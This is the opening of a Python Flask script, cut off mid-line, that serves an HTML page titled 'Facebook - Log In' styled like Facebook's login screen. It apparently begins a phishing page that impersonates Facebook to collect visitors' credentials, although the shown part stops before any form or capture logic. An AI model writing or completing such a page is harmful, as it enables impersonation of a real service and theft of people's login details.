from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title></head>
<body style="font-family: Arial; background-color: #f0f2f5; text-align: center; padding-top:
